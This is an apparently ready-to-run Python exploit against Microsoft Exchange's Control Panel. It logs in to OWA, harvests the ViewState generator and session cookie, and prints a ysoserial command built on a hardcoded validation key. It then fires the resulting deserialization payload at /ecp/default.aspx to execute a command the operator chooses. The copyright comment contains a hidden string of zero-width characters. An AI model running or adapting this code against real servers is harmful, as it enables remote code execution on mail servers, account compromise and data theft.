#!/usr/bin/env python
# Copyright 2019 Netease, Inc. All rights reserved. ⁠‌​​‌‌‌​‌⁠‌​​‌‌​‌​⁠‌‌​​​‌‌​⁠‌‌​​‌​​‌⁠‌‌​​‌‌​​⁠‌​​‌‌​​‌⁠‌‌​​‌‌‌‌⁠‌‌​​‌‌‌‌⁠‌​​‌‌​‌‌
import requests
import readline
import argparse
import re
import sys
import urllib3
from urllib.parse import urlparse
from urllib.parse import quote
urllib3.disable_warnings()


def get_value(url, user, pwd, timeout):
	print("[*] Tring to login owa...")
	tmp = urlparse(url)
	base_url = "{}://{}".format(tmp.scheme, tmp.netloc)
	# paramsPost = {"password": ""+pwd+"", "isUtf8": "1", "passwordText": "", "trusted": "4",
	# 			"destination": ""+url+"", "flags": "4", "forcedownlevel": "0", "username": ""+user+""}
	paramsPost = '''password={}&isUtf8=1&passwordText=&trusted=4&destination={}&flags=4&forcedownlevel=0&username={}'''.format(
            pwd, url, user)
	headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0", "Connection": "close", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Cookie": "PrivateComputer=true; PBack=0"}
	cookies = {"PBack": "0", "PrivateComputer": "true"}
	login_url = base_url + '/owa/auth.owa'
	print("[+] Login url: {}".format(login_url))
	try:
		login = session.post(login_url, data=paramsPost,
                       headers=headers, verify=False, timeout=timeout)
		print("[*] Status code:   %i" % login.status_code)
		if "reason=" in login.text or "reason=" in login.url and "owaLoading" in login.text:
			print("[!] Login Incorrect, please try again with a different account..")
			sys.exit(1)
		#print(str(response.text))
	except Exception as e:
		print("[!] login error , error: {}".format(e))
		sys.exit(1)
	print("[+] Login successfully! ")
	try:
		print("[*] Tring to get __VIEWSTATEGENERATOR...")
		target_url = "{}/ecp/default.aspx".format(base_url)
		new_response = session.get(target_url, verify=False, timeout=timeout)
		view = re.compile(
			'id="__VIEWSTATEGENERATOR" value="(.+?)"').findall(str(new_response.text))[0]
		print("[+] Done! __VIEWSTATEGENERATOR:{}".format(view))
	except:
		view = "B97B4E27"
		print("[*] Can't get __VIEWSTATEGENERATOR, use default value: {}".format(view))
	try:
		print("[*] Tring to get ASP.NET_SessionId....")
		key = session.cookies['ASP.NET_SessionId']
		print("[+] Done!  ASP.NET_SessionId: {}".format(key))
	except Exception as e:
		key = None
		print("[!] Get ASP.NET_SessionId error, error: {} \n[*] Exit..".format(e)) 
		sys.exit(1)
	return view, key, base_url

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-s", "--server", required=True, help="ECP Server URL Example: http://ip/owa")
	parser.add_argument("-u", "--user", required=True, help="Login account Example: domain\\user")
	parser.add_argument("-p", "--password", required=True, help="Password")
	parser.add_argument("-c", "--cmd", help="Command u want to execute", required=True)
	parser.add_argument(
		"-t", "--timeout", help="Timeout", default='30')
	args = parser.parse_args()
	url = args.server
	print("[*] Start to exploit..")
	user = args.user
	pwd = args.password
	command = args.cmd
	timeout = int(args.timeout)
	view, key, base_url = get_value(url, user, pwd, timeout)
	if key is None:
		sys.exit(1)
	print("""\nysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{}" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{}" --viewstateuserkey="{}" --isdebug –islegacy""".format(command,view,key))
	out_payload = input('\n[*] Please input ysoserial payload:')
	final_exp = "{}/ecp/default.aspx?__VIEWSTATEGENERATOR={}&__VIEWSTATE={}".format(
		base_url, view, quote(out_payload))
	print("\n[+] Exp url: {}".format(final_exp))
	print("\n[*] Trigger payload..")
	status = session.get(final_exp, verify=False, timeout=timeout)
	print(status.status_code)


session = requests.Session()
if __name__ == "__main__":
	main()



	
	
